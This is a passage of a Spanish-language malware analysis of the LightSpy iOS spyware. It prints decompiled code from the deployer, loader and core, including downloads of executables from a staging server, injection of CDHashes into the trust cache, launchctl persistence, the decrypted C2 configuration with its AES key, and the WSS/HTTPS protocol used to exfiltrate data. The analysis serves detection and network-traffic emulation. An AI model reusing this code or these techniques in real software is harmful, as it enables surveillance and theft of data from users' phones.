LightSpy, identificado por MITRE ATT&CK como [S1185](https://attack.mitre.org/software/S1185/), es una plataforma modular de vigilancia que combina un componente de despliegue, un núcleo encargado del mando y control y diferentes módulos funcionales. La familia se observó inicialmente en campañas contra dispositivos iOS comprometidos mediante cadenas de explotación servidas desde páginas web, como documentó [Kaspersky](https://securelist.com/ios-exploit-chain-deploys-lightspy-malware/96407/). Análisis posteriores han mostrado que su arquitectura y parte de su infraestructura se reutilizaron en otras plataformas; [ThreatFabric](https://www.threatfabric.com/blogs/lightspy-mapt-mobile-payment-system-attack) relaciona además varios nombres de módulos de iOS con esta misma familia.

La cadena estudiada presenta dos fases diferenciadas. En la primera, el binario de despliegue `095` descarga por HTTP diecisiete artefactos desde `45.83.237.13:8088` y prepara localmente los ejecutables Mach-O. En la segunda, `irc_loader` recupera de su propia configuración el extremo `45.134.1.180:50000`, carga el núcleo `light` y le entrega ese destino. El núcleo utiliza el extremo mediante dos protocolos de aplicación: un WebSocket protegido mediante TLS intercambia configuración, manifiestos, planes, órdenes y resultados, mientras que peticiones HTTPS independientes transportan registros, información del dispositivo y los ficheros producidos por las órdenes.

El análisis estático se apoya en cuatro Mach-O ARM64 concretos.

| Componente estudiado | Función en la cadena | MD5 | SHA-256 |
|---|---|---|---|
| `095` (`payload.dylib`) | Despliegue, descarga y preparación de los componentes | `4fe3ca4a2526088721c5bdf96ae636f4` | `d5239210a9bc0383f569e9ca095fe8bdfb9a482bc0c77c8658fcecb23b8a26bc` |
| `irc_loader` | Descifrado de la configuración, selección del C2 y carga de `light` | `53acd56ca69a04e13e32f7787a021bb5` | `1eec0e1ebeefc6667b6ee08e8dede5cd36ca10697180f10e2d43a2fdebbeefcb` |
| `light` | Núcleo, canal WSS y transferencias HTTPS auxiliares | `ff0f66b7089e06702ffaae6025b227f0` | `4887389ffaf4257b37408eac9f1740eabe805f830009cf58185757372f903667` |
| `ios_wechat` | Módulo funcional utilizado para ejemplificar una orden con salida de fichero | `66d2379318ce8f74cfbd0fb26afc2084` | `3c1bfbdfae91f1f248180c2102ed65fbdec086a334193894db67b0461a0485c5` |

Para la futura captura se selecciona un flujo que permitirá observar [T1407, Download New Code at Runtime](https://attack.mitre.org/techniques/T1407/) en las descargas ejecutables realizadas por `095`; `ios_wechat` será el cuerpo real de una de esas transferencias. [T1509, Non-Standard Port](https://attack.mitre.org/techniques/T1509/) aparece en el canal HTTP sobre TCP/8088 y en las comunicaciones WSS y HTTPS del C2 sobre TCP/50000. Después de la descarga, una orden `12005` servirá como ejemplo del funcionamiento del C2: la orden circulará por WSS, el fichero resultante se transferirá por HTTPS y la finalización regresará por WSS. Este fichero estará relacionado con la exfiltración de datos de la aplicación de mensajería WeChat.

La reproducción se implementará íntegramente mediante clientes y servidores Python aislados. El cliente generará directamente las comunicaciones derivadas del código y los servidores devolverán las respuestas necesarias para recorrer el flujo seleccionado. Los Mach-O se utilizarán únicamente como cuerpos estáticos y como fuente del análisis; la emulación se limitará al comportamiento observable en red.

Los fragmentos siguientes proceden del código descompilado de `095`, `irc_loader`, `light` e `ios_wechat`. Se han normalizado nombres de funciones, variables y tipos para eliminar artefactos del descompilador, pero se conservan las constantes, el orden de las llamadas, las condiciones y los campos que determinan el tráfico. Cuando el código disponible no permite recuperar un valor, se indica expresamente y no se sustituye por un indicador de otra variante de la familia.

### División de canales de red

La muestra utiliza tres conversaciones lógicas. Las dos últimas comparten el host y el puerto configurados para el C2, pero emplean conexiones y protocolos de aplicación diferentes.

| Canal | Extremo | Función |
|---|---|---|
| Descarga HTTP | `45.83.237.13:8088` | Descarga secuencial de los diecisiete artefactos. Contiene T1407 y utiliza un puerto no estándar. |
| C2 WSS | `45.134.1.180:50000` | Plano de control persistente: latidos, configuración, manifiestos, planes, órdenes, estados y resultados breves. |
| HTTPS auxiliar | `45.134.1.180:50000` | Peticiones independientes a `/api/log/`, `/api/phone/` y `/api/phone_shard_file` para registros, información del dispositivo y carga fragmentada de ficheros. |

El componente `095` contiene directamente el servidor de *staging*. El extremo del C2 se encuentra en la configuración cifrada incorporada al final de `irc_loader`; este selecciona su primera entrada y se la entrega a `light`. Los tres canales emplean direcciones IPv4 literales, por lo que alcanzan sus extremos sin una resolución DNS previa.

La función `FUN_00042788` compara `kCFCoreFoundationVersionNumber` con `1535.12`, valor correspondiente a iOS 12.0, para seleccionar estructuras y desplazamientos internos. La tabla publicada por [Kaspersky](https://securelist.com/ios-exploit-chain-deploys-lightspy-malware/96407/) sitúa las variantes de esta cadena en versiones antiguas de iOS y documenta soporte para iOS 12.2 en febrero de 2020. La reproducción evita esa dependencia mediante un cliente Python que genera el tráfico y servidores Python que emulan los extremos de *staging* y C2.

### Descarga y preparación inicial

#### Secuencia completa de artefactos

La función `FUN_00042788` contiene las diecisiete solicitudes en un orden fijo. Las primeras dieciséis pasan por `FUN_00042618`, que descarga el fichero, extrae el *CodeDirectory*, calcula el CDHash, intenta incorporarlo a la *trust cache* y aplica permisos de ejecución. El último recurso, `ircbin.plist`, se obtiene mediante `FUN_00006734` porque no es un Mach-O.

El flujo normalizado es el siguiente:

```c
#define STAGE_BASE "http://45.83.237.13:8088/963852741/hh1212/"
#define BUNDLE_DIR "/var/containers/Bundle/"

void FUN_00042788(void) {
    FUN_00042618(STAGE_BASE "browser",
                 BUNDLE_DIR "browser");
    FUN_00042618(STAGE_BASE "EnvironmentalRecording",
                 BUNDLE_DIR "EnvironmentalRecording");
    FUN_00042618(STAGE_BASE "FileManage",
                 BUNDLE_DIR "FileManage");
    FUN_00042618(STAGE_BASE "ios_qq",
                 BUNDLE_DIR "ios_qq");
    FUN_00042618(STAGE_BASE "ios_telegram",
                 BUNDLE_DIR "ios_telegram");
    FUN_00042618(STAGE_BASE "ios_wechat",
                 BUNDLE_DIR "ios_wechat");
    FUN_00042618(STAGE_BASE "KeyChain",
                 BUNDLE_DIR "KeyChain");
    FUN_00042618(STAGE_BASE "light",
                 BUNDLE_DIR "light");
    FUN_00042618(STAGE_BASE "Screenaaa",
                 BUNDLE_DIR "Screenaaa");
    FUN_00042618(STAGE_BASE "ShellCommandaaa",
                 BUNDLE_DIR "ShellCommandaaa");
    FUN_00042618(STAGE_BASE "SoftInfoaaa",
                 BUNDLE_DIR "SoftInfoaaa");
    FUN_00042618(STAGE_BASE "WifiList",
                 BUNDLE_DIR "WifiList");
    FUN_00042618(STAGE_BASE "locationaaa.dylib",
                 BUNDLE_DIR "locationaaa.dylib");
    FUN_00042618(STAGE_BASE "baseinfoaaa.dylib",
                 BUNDLE_DIR "baseinfoaaa.dylib");
    FUN_00042618(STAGE_BASE "irc_loader",
                 BUNDLE_DIR "irc_loader");
    FUN_00042618(STAGE_BASE "launchctl",
                 BUNDLE_DIR "launchctl");
    FUN_00006734(STAGE_BASE "ircbin.plist",
                 BUNDLE_DIR "ircbin.plist");
}
```

El valor devuelto por cada llamada se descarta antes de invocar la siguiente, de modo que la secuencia continúa aunque falle la recuperación o preparación de un componente. Cada llamada a `FUN_00006734` crea una operación de libcurl, espera a que termine y libera sus recursos. Las diecisiete transacciones HTTP se producen así de forma secuencial, una por artefacto.

#### Descarga HTTP con libcurl

La función `FUN_00006734` elimina primero el destino, lo abre para escritura y configura las opciones mínimas de libcurl. El comportamiento normalizado es:

```c
int FUN_00006734(const char *url, const char *destination) {
    FILE *output;
    CURL *curl;
    CURLcode result = CURLE_FAILED_INIT;

    remove(destination);
    output = fopen(destination, "wb");
    if (output == NULL)
        return 0;

    curl = curl_easy_init();
    if (curl != NULL) {
        curl_easy_setopt(curl, CURLOPT_URL, url);                 // 0x2712
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION,
                         FUN_000066d0);                          // 0x4e2b
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, output);       // 0x2711
        curl_easy_setopt(curl, CURLOPT_XFERINFOFUNCTION,
                         FUN_0000670c);                          // 0x4efb
        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 0L);          // 0x002b

        result = curl_easy_perform(curl);
        if (result != CURLE_OK)
            /* La muestra registra el error de libcurl. */

        curl_easy_cleanup(curl);
    }

    fclose(output);
    return 1;
}
```

La función `FUN_000066d0` entrega cada bloque recibido a `fwrite` y devuelve directamente el resultado de la escritura a libcurl. Una escritura incompleta puede señalar así un error de transferencia. La función de progreso `FUN_0000670c` devuelve siempre cero y permite que la operación continúe. La configuración fija la URL, la función de escritura, el fichero de destino y el seguimiento del progreso; el resto del comportamiento HTTP depende de los valores predeterminados de la versión de libcurl incorporada. En particular, la función no activa `CURLOPT_FAILONERROR`, por lo que una respuesta HTTP de error puede escribirse en el fichero de destino.

Existe además una diferencia importante entre el resultado de red y el resultado que ve la función superior. Una vez abierto el fichero de destino, `FUN_00006734` devuelve `1` aunque `curl_easy_init` falle o `curl_easy_perform` termine con error. Por ello, el código puede intentar procesar un fichero vacío, parcial o incluso una respuesta HTTP de error guardada en disco.

La futura captura incluirá las diecisiete transferencias en el orden recuperado. Los cuerpos de `ios_wechat`, `light` e `irc_loader` corresponderán a los tres artefactos disponibles y se servirán únicamente como contenido estático. Los otros trece ejecutables se representarán mediante cuerpos Mach-O sintéticos e inertes, mientras que `ircbin.plist` utilizará un plist sintético. Los diecisiete cuerpos pertenecen a los recursos solicitados por el desplegador `095`. La descarga de `ios_wechat` se toma como ejemplo para desarrollar la representación de red.

```asm
00047a94  adrp x1,0x9e000
00047a98  add  x1,x1,#0xe78        ; URL de ios_wechat
00047a9c  adrp x30,0x9e000
00047aa0  add  x30,x30,#0xead      ; destino de ios_wechat
00047aa8  mov  x0,x1
00047aac  mov  x1,x30
00047ab0  bl   0x00042618           ; FUN_00042618
```

En red, esta llamada produce semánticamente la siguiente transacción. Solo las propiedades fijadas por el código se tratarán como invariantes; las cabeceras auxiliares dependen de la versión de libcurl.

```http
GET /963852741/hh1212/ios_wechat HTTP/<versión seleccionada por libcurl>
Host: 45.83.237.13:8088

HTTP/<versión> 200 OK
Content-Length: <longitud_del_artefacto>
Content-Type: <tipo_configurado_por_el_servidor>

<cuerpo de ios_wechat>
```

El puerto `8088` pertenece a la propia URL y es la manifestación de T1509 en el flujo seleccionado.

#### Validación Mach-O, CDHash y *trust cache*

Tras una descarga que la envoltura considera satisfactoria, `FUN_00042618` intenta preparar el artefacto. Su orden de operaciones es:

```c
int FUN_00042618(const char *url, const char *path) {
    uint8_t *code_directory;
    uint8_t *sha256;

    if (!FUN_00006734(url, path))
        return 0;

    code_directory = FUN_000068fc(path);
    if (code_directory == NULL)
        return 0;

    sha256 = FUN_00006b34(code_directory);
    free(code_directory);
    if (sha256 == NULL)
        return 0;

    FUN_00042500(sha256);
    chmod(path, 0755);
    return 1;
}
```

La función `FUN_000068fc` abre el fichero y comprueba que el campo `magic` de la cabecera tenga el valor `0xfeedfacf`, correspondiente a un Mach-O de 64 bits. A continuación recorre los comandos de carga hasta localizar `LC_CODE_SIGNATURE`, identificado por `0x1d`, y extrae el bloque definido por `dataoff` y `datasize`.

```c
uint8_t *FUN_000068fc(const char *path) {
    mach_header_64 header;

    read_exact(path, &header, sizeof(header));
    if (header.magic != 0xfeedfacf)
        return NULL;

    for (uint32_t i = 0; i < header.ncmds; i++) {
        load_command command = read_load_command();
        if (command.cmd == LC_CODE_SIGNATURE) {
            linkedit_data_command signature = read_signature_command();
            return read_range(path, signature.dataoff, signature.datasize);
        }
        skip_to_next_load_command(command.cmdsize);
    }
    return NULL;
}
```

La función `FUN_00006b34` busca dentro de la firma la estructura *CodeDirectory*, identificada por la constante `0xfade0c02` definida para ese tipo de bloque. Después obtiene su longitud y calcula SHA-256 sobre la estructura completa. La función `FUN_00042500` construye una entrada de versión `1`, genera un UUID y copia únicamente los primeros veinte bytes del resumen en el campo CDHash antes de solicitar su carga en la *trust cache*.

```c
uint8_t *FUN_00006b34(uint8_t *signature_blob) {
    code_directory *cd = find_blob(signature_blob, 0xfade0c02);
    if (cd == NULL)
        return NULL;

    uint32_t length = from_big_endian(cd->length);
    uint8_t *digest = malloc(CC_SHA256_DIGEST_LENGTH);
    CC_SHA256(cd, length, digest);
    return digest;
}

int FUN_00042500(const uint8_t sha256[32]) {
    trust_cache cache = {0};
    cache.version = 1;
    generate_uuid(cache.uuid);
    cache.count = 1;
    memcpy(cache.entries[0].cdhash, sha256, 20);
    return kernel_load_trust_cache(&cache);
}
```

Este bloque prepara los dieciséis Mach-O descargados mediante `FUN_00042618`; `ircbin.plist` queda fuera porque se obtiene directamente con `FUN_00006734`. La comprobación confirma que cada fichero presenta la estructura necesaria para localizar su `CodeDirectory`, pero no compara su contenido con un hash esperado ni acredita la integridad de la descarga. Los resultados de la carga en la *trust cache* y de `chmod` tampoco condicionan el `return 1` de `FUN_00042618`. Estas operaciones son locales y justifican que `095` trata los cuerpos recibidos como código destinado a una carga posterior.

#### Entrega al cargador

Al final de la secuencia, `095` ejecuta el `launchctl` descargado dos veces. Primero solicita la retirada del servicio definido por el plist mediante `unload` y después solicita su carga mediante `load`:

```c
FUN_00056714(BUNDLE_DIR "launchctl",
             "unload",
             BUNDLE_DIR "ircbin.plist",
             NULL);

FUN_00056714(BUNDLE_DIR "launchctl",
             "load",
             BUNDLE_DIR "ircbin.plist",
             NULL);
```

La función `FUN_00056714` recibe el programa y una lista de argumentos, construye el vector `argv` y llama a `FUN_0005228c`; esta última crea el proceso mediante `posix_spawn` y espera a que termine. En concreto, `095` ejecuta `launchctl unload ircbin.plist` y después `launchctl load ircbin.plist`. Ambas acciones son locales. La ausencia del plist impide recuperar literalmente su `ProgramArguments` y demostrar desde ese fichero que el servicio apunta a `/var/containers/Bundle/irc_loader`. El cargador disponible permite continuar el análisis desde su propia entrada y cerrar el enlace causal hasta `light`.

#### Configuración de `irc_loader` y arranque de `light`

La función `entry`, situada en `0x100004e34`, abre `/var/containers/Bundle/irc_loader`, lee los últimos `0x400` bytes del propio fichero y entrega la cadena obtenida a `_dictionaryWithJsonString`, situada en `0x100004d28`. Este segundo método elimina espacios y caracteres de control, convierte la representación hexadecimal en bytes, los descifra y analiza el resultado como JSON.

```objective-c
int entry(void) {
    char tail[0x400] = {0};
    FILE *self = fopen("/var/containers/Bundle/irc_loader", "r");

    if (self != NULL) {
        fseek(self, -0x400, SEEK_END);
        fread(tail, 1, 0x400, self);
        NSString *encoded = [NSString stringWithFormat:@"%s", tail];
        NSDictionary *config = _dictionaryWithJsonString(encoded);
        /* La configuración se entrega después a lightmanage. */
    }
}
```

La conversión y el descifrado se realizan en `Aes::stringFromHexString:`, situado en `0x100005354`, y `_decrypt_data`, situado en `0x1000054f4`. La segunda función configura AES-128-ECB con la clave ASCII `3e2717e8b3873b29`, codificada en el propio cargador, y descifra el contenido por bloques de 16 bytes. La configuración recuperada de esta muestra es:

```json
{
  "strDownAddress": "http://192.168.148.10:10080/androidmm/light",
  "strConsoleParam": "s4|12|1",
  "ip_port": [
    {
      "uRemotePort": "50000",
      "strRemoteIP": "45.134.1.180"
    },
    {
      "uRemotePort": "50000",
      "strRemoteIP": "192.168.145.8"
    },
    {
      "uRemotePort": "50000",
      "strRemoteIP": "192.168.145.8"
    }
  ]
}
```

El método `InitialLightManag:`, situado en `0x100004798`, conserva `strDownAddress`, `strConsoleParam` e `ip_port`. La función `entry` selecciona `ip_port[0]` y utiliza `45.134.1.180:50000`. El método `loadLight:`, situado en `0x100004a78`, abre directamente `/var/containers/Bundle/light`; la URL privada almacenada en `strDownAddress` queda fuera de esta ruta de ejecución.

Después de seleccionar la primera entrada, `loadLight:` abre el núcleo mediante `dlopen(path, 2)`. El método `start:ipaddr:port:param:`, situado en `0x100004b40`, resuelve con `dlsym` la exportación `start` y le pasa el directorio de trabajo, la IP, el puerto y el parámetro. El comportamiento normalizado es:

```objective-c
NSDictionary *selected = [[manager GetIpPort] objectAtIndex:0];
NSString *ip = selected[@"strRemoteIP"];       // 45.134.1.180
NSString *port = selected[@"uRemotePort"];    // 50000
NSString *parameter = [manager GetParam];      // s4|12|1
NSString *workdir = [manager GetWorkDir];      // /var/iolight

void *handle = dlopen("/var/containers/Bundle/light", 2);
void (*startCore)(NSString *, NSString *, NSString *, NSString *) =
    dlsym(handle, "start");

if (startCore != NULL)
    startCore(workdir, ip, port, parameter);
```

El ARM64 confirma tanto el índice seleccionado como la distribución de argumentos en la llamada Objective-C:

```asm
10000502c  mov x2,#0x0        ; objectAtIndex:0
100005030  bl  0x10000755c    ; objc_msgSend
10000504c  bl  0x10000755c    ; objectForKey:"strRemoteIP"
100005064  bl  0x10000755c    ; objectForKey:"uRemotePort"
10000508c  mov x2,x22         ; /var/iolight
100005090  mov x3,x24         ; 45.134.1.180
100005094  mov x4,x20         ; 50000
100005098  bl  0x10000755c    ; start:ipaddr:port:param:
```

El cargador enlaza localmente las dos fases. El primer paquete posterior procede ya de `light`, y la llamada a `start` determina que tanto el canal WSS como las peticiones HTTPS auxiliares utilicen `45.134.1.180:50000`.

### Desarrollo cronológico del canal C2

#### Extremo entregado a `light` y primer registro HTTPS

La función de entrada de `light`, situada en `0x00018d2c`, recibe el directorio de trabajo, la dirección, el puerto y un parámetro adicional. El análisis conjunto con `irc_loader` permite concretarlos como `/var/iolight`, `45.134.1.180`, `50000` y `s4|12|1`. La llamada a `setNetWork:port:` almacena la dirección y el puerto antes de inicializar el gestor HTTP; por ello, la primera operación de red del núcleo ya puede construir una URL completa hacia el C2.

```objective-c
int _start(NSString *workdir,
           NSString *ipaddr,
           NSString *port,
           NSString *parameter) {
    [MainFrame setWorkDir:workdir];
    [MainFrame setNetWork:ipaddr port:port];
    [[Common instance] initial:0];

    [[Common instance] sendLog:10000
                              c:@"进入启动程序,开启启动取证程序!"];

    [MainFrame start:workdir
              ipaddr:ipaddr
                port:port
               param:parameter];
    [MainA startTimer];
    return 1;
}
```

El método `Common::sendLog:c:`, situado en `0x00012d7c`, materializa esa llamada como una petición HTTPS cuyo cuerpo utiliza el tipo `multipart/form-data` y contiene tres partes. En este contexto, la palabra *form-data* designa una codificación de cuerpos HTTP: la comunicación no contiene HTML ni procede de un formulario mostrado en una página web. El valor `content` mostrado en el fragmento es la cadena literal asociada a la entrada de `light`.

```objective-c
NSMutableDictionary *form = [NSMutableDictionary dictionary];
form[@"uid"] = [GlobalVar getDeviceID];
form[@"cmd"] = @10000;
form[@"content"] = content;

[httpManager postForm:form
                 toUrl:[self getUrlFromUri:@"/api/log/"]
          onCompletion:nil
               runLoop:0];
```

La envoltura de Curl ejecuta estas peticiones multipart en una cola concurrente. El inicializador situado en `0x00022050` crea `post_sem` con valor `5`; cada llamada situada en `0x000221c0` toma una plaza antes de enviar la operación a `post_Queue` y la libera después de procesar la respuesta. La función situada en `0x00022890` crea un manejador libcurl para cada operación, construye el cuerpo multipart, desactiva las comprobaciones del certificado y del nombre, fija un tiempo máximo de 300000 milisegundos, ejecuta la transferencia y destruye el manejador:

```c
post_Queue = dispatch_queue_create("post", DISPATCH_QUEUE_CONCURRENT);
post_sem = dispatch_semaphore_create(5);

dispatch_semaphore_wait(post_sem, DISPATCH_TIME_FOREVER);
dispatch_async(post_Queue, ^{
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 300000L);
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, multipart_form);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    parse_response(response_buffer + 4);
    dispatch_semaphore_signal(post_sem);
});
```

La primera operación de red solicitada por `light` es el `POST /api/log/` originado por la llamada a `sendLog` de su función de entrada. La cola admite hasta cinco peticiones multipart simultáneas; una sexta llamada espera a que termine una de las transferencias activas. Cada petición utiliza un manejador nuevo y, por tanto, una conexión TCP/TLS independiente. El código fija el orden de invocación, pero la ejecución concurrente permite que las conexiones, las peticiones y las respuestas se intercalen. El contenido descifrado del primer `POST /api/log/` presenta la siguiente estructura:

```http
POST /api/log/ HTTP/<versión seleccionada por libcurl>
Host: 45.134.1.180:50000
Content-Type: multipart/form-data; boundary=<boundary>
Content-Length: <longitud>

--<boundary>
Content-Disposition: form-data; name="uid"

<device_id>
--<boundary>
Content-Disposition: form-data; name="cmd"

10000
--<boundary>
Content-Disposition: form-data; name="content"

进入启动程序,开启启动取证程序!
--<boundary>--
```

El orden físico de las partes depende de la enumeración del diccionario que realiza la biblioteca. La respuesta se conserva en un búfer y la envoltura descarta sus cuatro primeros bytes antes de interpretar el resto como JSON:

```http
HTTP/<versión> <estado>
Content-Length: <longitud>

<prefijo de 4 bytes><objeto JSON>
```

Las peticiones posteriores a `/api/log/` y `/api/phone/` atraviesan la misma cola y comparten el límite de cinco operaciones simultáneas. El semáforo limita la concurrencia, pero no serializa las transferencias ni fija el orden de sus respuestas.

La futura captura conservará las direcciones y los puertos históricos dentro de una red Linux aislada en WSL. Las direcciones se asignarán localmente al cliente Python y a los servidores emulados, y la red permanecerá aislada de Internet. La configuración concreta se desarrollará en el laboratorio.

#### Segundo registro, preparación del WSS y comprobación de alcanzabilidad

El método `MainFrame::start:ipaddr:port:param:`, situado en `0x0001ae78`, comienza con un segundo registro HTTPS. A continuación inicializa el estado local, entrega el extremo al gestor WebSocket y programa una comprobación auxiliar de conectividad basada en `www.baidu.com`. Por último, genera el tercer registro y pone en marcha los hilos de órdenes y de ciclo principal. El siguiente fragmento conserva las llamadas que afectan al orden de red:

```objective-c
- (BOOL)start:(NSString *)workdir
        ipaddr:(NSString *)ipaddr
          port:(NSString *)port
         param:(NSString *)parameter {
    [[Common instance] sendLog:10000 c:@"程序开始初始化!"];

    /* Inicialización local de variables, base de datos, planes y módulos. */
    self.mDstip = ipaddr;
    self.mPort = port;
    self.mConsoleParam = parameter;

    [[SocketRocketUtility instance]
        setConfig:[GlobalVar getDeviceID]
            dstIP:self.mDstip
          dstPort:self.mPort
             param:self.mConsoleParam];

    [[NSNotificationCenter defaultCenter]
        addObserver:self
           selector:@selector(reachabilityChanged)
               name:kNetWorkReachabilityChangedNotification
             object:nil];
    hostReachability =
        [HLNetWorkReachability reachabilityWithHostName:@"www.baidu.com"];
    [hostReachability startNotifier];

    [[Common instance] sendLog:10000 c:@"程序完成初始化工作!"];
    [CommandThread startCommandThread];
    [mainThread start];
    return YES;
}
```

La segunda llamada a `sendLog` produce otra petición multipart con `content` igual a `程序开始初始化!`. Se invoca después del primer `POST /api/log/`, pero ambas transferencias pueden permanecer activas a la vez porque `post_sem` dispone de cinco plazas. Después de enviar la segunda operación a la cola concurrente, el método continúa y configura el WebSocket mientras las peticiones HTTPS pueden seguir en curso.

El método `WebSocketModule::setConfigWithDeviceId:serverIp:serverPort:requestParam:`, situado en `0x000094b4`, deriva un token a partir del identificador del dispositivo y codifica en hexadecimal un objeto de registro. El método auxiliar que realiza la conversión contiene `base64` en su nombre, pero la ruta WebSocket utiliza la representación hexadecimal de la cadena JSON.

```objective-c
NSString *secret = [NSString stringWithFormat:
    @"%@abcdef!@#$%%^123456ABCDEF", deviceID];
NSString *token = MD5(secret);

NSDictionary *registration = @{
    @"os": @"ios",
    @"app": [MainFrame getMode],
    @"param": requestParam
};

NSString *json = JSONString(registration);
NSString *hexConfig = hexStringFromString(json);

self.path = [NSString stringWithFormat:
    @"/android_ws/%@/%@/S4|%@",
    deviceID, token, hexConfig];
self.serverAddr = serverIp;
self.port = [serverPort intValue];

self.context = lws_create_context(&contextInfo);
self.thread = [[NSThread alloc] initWithBlock:^{
    while (websocket_run == 1 &&
           (self.socketStatus < 2 || self.socketStatus > 4)) {
        if (lws_service(self.context, 0) < 0)
            break;
    }
}];
[self.thread start];
```

La creación del contexto inicia un hilo de servicio de libwebsockets. Su evento `LWS_CALLBACK_PROTOCOL_INIT` invoca `WebSocketModule::start`, situado en `0x000099e8`, y rellena `lws_client_connect_info` con el destino recibido de `irc_loader`:

```c
struct lws_client_connect_info info = {0};
info.context = websocket_context;
info.address = server_address;
info.port = server_port;
info.path = websocket_path;
info.host = server_address;
info.origin = server_address;
info.ssl_connection = 7;
info.protocol = "irc-test-proto";
info.local_protocol_name = "irc-test";

client = lws_client_connect_via_info(&info);
```

El valor `7` activa TLS, acepta certificados autofirmados y omite la comprobación del nombre del servidor. La cadena `irc-test` selecciona el protocolo local registrado en libwebsockets y `irc-test-proto` viaja en la cabecera `Sec-WebSocket-Protocol`. La cadena `S4|` forma parte de la ruta construida por la muestra. Antes del cifrado, la actualización HTTP equivale a:

```http
GET /android_ws/<device_id>/<md5>/S4|<hex_json> HTTP/1.1
Host: 45.134.1.180:50000
Origin: http://45.134.1.180
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <valor_aleatorio>
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: irc-test-proto

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: <valor_derivado>
Sec-WebSocket-Protocol: irc-test-proto
```

Las cabeceras de actualización las genera la biblioteca; el código fija la ruta, el host, el origen derivado del host, el puerto y el subprotocolo. Tras la respuesta `101`, las cargas de aplicación circulan como texto JSON dentro de tramas RFC 6455. La llamada a `lws_write` recibe el modo `LWS_WRITE_TEXT`, por lo que el cliente utiliza opcode de texto, finaliza la carga entregada en esa llamada y aplica la máscara exigida a las tramas de cliente; las tramas de servidor llegan sin máscara. El nombre `irc-test-proto` identifica el subprotocolo WebSocket empleado por esta implementación.

La comprobación auxiliar introducida en `MainFrame::start` se programa después de crear el hilo WSS. Este puede comenzar su conexión mientras continúan las instrucciones siguientes. Los métodos situados en `0x00021948` y `0x00021ad8` entregan `www.baidu.com` a SystemConfiguration, registran una función de retorno y programan la consulta en el bucle de ejecución:

```objective-c
+ (id)reachabilityWithHostName:(NSString *)hostname {
    SCNetworkReachabilityRef ref =
        SCNetworkReachabilityCreateWithName(NULL, [hostname UTF8String]);
    return [[self alloc] initWithReachabilityRef:ref];
}

- (BOOL)startNotifier {
    SCNetworkReachabilitySetCallback(reachabilityRef,
                                     ReachabilityCallback,
                                     &context);
    return SCNetworkReachabilityScheduleWithRunLoop(
        reachabilityRef,
        CFRunLoopGetCurrent(),
        kCFRunLoopDefaultMode);
}
```

El núcleo entrega `www.baidu.com` a SystemConfiguration únicamente para comprobar si el dispositivo dispone de conectividad. Esta comprobación puede generar una consulta DNS, de tipo determinado por el resolutor; una respuesta válida en caché permite obtener el estado sin emitirla. El resultado se utiliza para las notificaciones locales de alcanzabilidad y no inicia una comunicación de aplicación con Baidu. Los tres canales descritos al principio continúan utilizando sus direcciones IPv4 literales.

Después de programar la alcanzabilidad, `MainFrame::start` invoca el tercer `sendLog`, cuyo `content` es `程序完成初始化工作!`. La llamada ocupa otra plaza de `post_sem` y envía la petición a la cola concurrente. A continuación, la función inicia `CommandThread` y el hilo principal sin esperar la respuesta de ese `POST /api/log/`. Las tres transferencias HTTPS iniciales, la resolución eventual de Baidu y el establecimiento WSS pueden intercalarse en la captura.

#### Estado del WebSocket y emisión de la cola

La función de retorno situada en `0x00009bf0` establece el estado, entrega las tramas entrantes al despachador y vacía una cola de mensajes al recibir permiso de escritura:

```c
int FUN_00009bf0(struct lws *wsi,
                 enum lws_callback_reasons reason,
                 void *user, void *data, size_t length) {
    switch (reason) {
    case LWS_CALLBACK_CLIENT_ESTABLISHED:
        setSocketStatus(1);
        lws_set_timer_usecs(wsi, 5000000);
        break;

    case LWS_CALLBACK_CLIENT_RECEIVE: {
        setSocketStatus(5);
        NSString *message = utf8_string(data, length);
        [receiver ReceiveMessageWithString:message];
        break;
    }

    case LWS_CALLBACK_CLIENT_WRITEABLE: {
        NSString *message = dequeue_message();
        if (message != nil)
            lws_write(wsi,
                      utf8_bytes(message),
                       utf8_length(message),
                       LWS_WRITE_TEXT);
        lws_callback_on_writable(wsi);
        break;
    }

    case LWS_CALLBACK_TIMER:
        lws_callback_on_writable(wsi);
        lws_set_timer_usecs(wsi, 10000000);
        break;

    case LWS_CALLBACK_CLIENT_CONNECTION_ERROR:
        client = NULL;
        setSocketStatus(2);
        break;

    case LWS_CALLBACK_CLIENT_CLOSED:
        client = NULL;
        setSocketStatus(3);
        break;
    }
    return 0;
}
```

El temporizador inicial de libwebsockets se programa a cinco segundos y los siguientes a diez. En cada evento de escritura se extrae la siguiente cadena de la cola FIFO y se envía mediante `lws_write` como una trama de texto. Los estados `1` y `5` corresponden, respectivamente, al establecimiento y a la recepción de datos; los estados `2` y `3` registran error y cierre. Al terminar el hilo tras uno de esos estados, el módulo vuelve a `0`; una iteración posterior de `checkWebSocket` crea entonces otro contexto y puede originar una conexión TCP/TLS y un saludo nuevos. El flujo seleccionado mantiene la primera conexión satisfactoria. Los mensajes generados antes de completar el saludo permanecen pendientes hasta que el canal admite escritura.

#### Carga inicial de módulos y mensajes pendientes

El arranque de `CommandThread` crea su cola, introduce el valor `2` y espera un segundo antes de extraerlo. El despachador asocia ese valor con `InitPlugin`, que llama a `LoadPluginList`. Esta ruta se ejecuta durante el inicio y precede a cualquier manifiesto recibido desde el C2.

```objective-c
- (void)CommandThreadEntryPoint {
    threadQueue = CreateEmptySequence();
    [self EnQueue:2];

    while (thread_run) {
        sleep(1);
        if ([self DeQueue:&message] == 0)
            [self DispatchMessage:message];
    }
}

- (void)DispatchMessage:(int)message {
    if (message == 2)
        [self InitPlugin];
}

- (void)InitPlugin {
    [PluginManage LoadPluginList];
}
```

El método `LoadPluginList`, situado en `0x000276ac`, combina las dos colas de red con las comprobaciones locales en este orden de llamada:

```objective-c
- (void)LoadPluginList {
    [[Common instance] sendLog:10000 c:@"开始加载插件列表..."];
    [self SendPluginListInfo];
    [self DownPluginTask];
